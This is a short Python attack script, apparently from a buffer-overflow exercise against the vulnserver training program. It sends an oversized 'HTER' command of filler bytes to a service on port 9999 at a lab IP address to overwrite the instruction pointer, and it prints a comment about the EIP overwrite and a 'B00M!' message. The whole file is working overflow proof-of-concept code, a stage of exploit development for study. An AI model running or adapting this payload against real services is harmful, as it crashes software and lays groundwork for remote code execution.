#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)


def validate_len(payload):
    exploit_len = 5000
    payload_len = len(payload)
    if payload_len != exploit_len:
        print('[!] Payload was length {pl}, expected {el}'.format(
            pl=payload_len, el=exploit_len))
        exit(1)


if __name__ == '__main__':
    print('[*] building payload and running validations')
    payload = "HTER 0"
    # overwrote EIP with CDABCDAB - note the capitalization, whcih we didn't send
    payload += "A" * 2000
    payload += "B" * 40
    payload += "C" * 40
    payload += "D" * 40
    payload += "E" * 40
    payload += "F" * 40
    payload += "A" * 2792
    payload += "\r\n"
    validate_len(payload)
    print('[*] validations passed')
    print('[*] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    print('[*] connected. waiting for welcome message')
    welcome = s.recv(1024)
    print('[*] received message:\n\t{msg}'.format(msg=welcome))
    print('[*] sending payload')
    s.send(payload)
    print('[*] B00M!')
    s.close()
